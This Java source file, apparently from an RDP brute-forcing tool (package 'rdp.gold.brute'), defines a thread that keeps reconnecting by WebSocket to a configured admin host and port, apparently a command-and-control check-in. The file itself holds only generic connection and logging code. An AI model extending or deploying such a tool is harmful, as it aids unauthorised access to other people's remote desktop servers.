package rdp.gold.brute.synchronizer;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.URI;
import org.apache.log4j.Logger;
import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
import org.eclipse.jetty.websocket.client.WebSocketClient;
import rdp.gold.brute.Config;

public class SynchronizerClient extends Thread {
    private final Logger logger = Logger.getLogger(SynchronizerClient.class);

    public void run() {
        for (;;) {
            this.logger.info("Start syncrhonizer");

            String destUri = "ws://" + Config.HOST_ADMIN + ":" + Config.PORT_ADMIN;

            WebSocketClient client = new WebSocketClient();
            SynchronizerSocket socket = new SynchronizerSocket();
            try {
                client.start();

                URI echoUri = new URI(destUri);
                ClientUpgradeRequest request = new ClientUpgradeRequest();
                client.connect(socket, echoUri, request);

                this.logger.info("Run connect to server on ip: " + Config.HOST_ADMIN + ":" + Config.PORT_ADMIN);

                socket.start();
                socket.join();
                try {
                    client.stop();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException e) {
                    this.logger.error(e);
                }
            } catch (Exception e) {
                StringWriter sw = new StringWriter();
                e.printStackTrace(new PrintWriter(sw));
                this.logger.error(e + " " + sw);
            } finally {
                try {
                    client.stop();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
